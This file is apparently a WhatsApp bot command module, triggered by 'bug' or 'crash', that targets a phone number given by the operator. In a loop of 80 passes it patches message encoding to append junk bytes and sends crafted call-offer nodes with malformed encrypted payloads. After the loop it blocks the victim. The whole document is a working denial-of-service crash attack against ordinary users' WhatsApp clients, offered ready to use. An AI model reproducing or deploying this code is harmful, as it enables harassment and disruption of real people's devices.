import "../settings.js";
import { jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } from "@ryuu-reinzz/baileys";
import crypto from "crypto";

export default {
  command: ["simplebug", "bug", "crash"],
  group: false,
  premium: false,
  limit: false,
  admin: false,
  creator: true,
  botAdmin: false,
  privates: false,
  usePrefix: true,
  disable: false,

  code: async (m, { RyuuBotz, reply, text, qbotz }) => {
    if (!text) return reply("*Mana targetnya* 🤔")

    const rawTarget = text.replace(/\D/g, "")
    const target = rawTarget + "@s.whatsapp.net"

    await reply("*Bentar yahhh* 🍡")

    for (let i = 0; i < 80; i++) {      
    try {
    let devices = (
        await RyuuBotz.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await RyuuBotz.assertSessions(devices);

    let createMutex = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch {}
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let mutexManager = createMutex();
    let mergeBuffer = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let originalCreateParticipantNodes = RyuuBotz.createParticipantNodes.bind(RyuuBotz);
    let encodeMsg = RyuuBotz.encodeWAMessage?.bind(RyuuBotz);

    RyuuBotz.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (RyuuBotz.patchMessageBeforeSending?.(message, recipientJids) ?? message);
        let mapped = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = RyuuBotz.authState.creds.me;
        let decodedLidUser = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        let nodes = await Promise.all(mapped.map(async ({ recipientJid: jid, message: msg }) => {
            let { user: targetUser } = jidDecode(jid);
            let { user: ownPnUser } = jidDecode(meId);
            let isOwnUser = targetUser === ownPnUser || targetUser === decodedLidUser;
            let isSelf = jid === meId || jid === meLid;

            if (dsmMessage && isOwnUser && !isSelf) msg = dsmMessage;

            let bytes = mergeBuffer(encodeMsg ? encodeMsg(msg) : encodeWAMessage(msg));

            return mutexManager.mutex(jid, async () => {
                let { type, ciphertext } = await RyuuBotz.signalRepository.encryptMessage({ jid, data: bytes });
                if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
                return {
                    tag: 'to',
                    attrs: { jid },
                    content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
                };
            });
        }));

        return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
    };

    let { nodes: destinations, shouldIncludeDeviceIdentity } =
        await RyuuBotz.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

    let callNode = {
        tag: "call",
        attrs: { to: target, id: RyuuBotz.generateMessageTag(), from: RyuuBotz.user.id },
        content: [{
            tag: "offer",
            attrs: {
                "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                "call-creator": RyuuBotz.user.id
            },
            content: [
                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                {
                    tag: "video",
                    attrs: {
                        orientation: "0",
                        screen_width: "1920",
                        screen_height: "1080",
                        device_orientation: "0",
                        enc: "vp8",
                        dec: "vp8"
                    }
                },
                { tag: "net", attrs: { medium: "3" } },
                { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                { tag: "encopt", attrs: { keygen: "2" } },
                { tag: "destination", attrs: {}, content: destinations },
                ...(shouldIncludeDeviceIdentity
                    ? [{
                        tag: "device-identity",
                        attrs: {},
                        content: encodeSignedDeviceIdentity(RyuuBotz.authState.creds.account, true)
                    }]
                    : [])
            ]
        }]
    };

    await RyuuBotz.sendNode(callNode);
    
         } catch (err) {
            console.error(err);
         }        
      await global.sleep(2000);
    }
    await RyuuBotz.updateBlockStatus(target, "block");
    await reply("*Done yapp*");
  }
}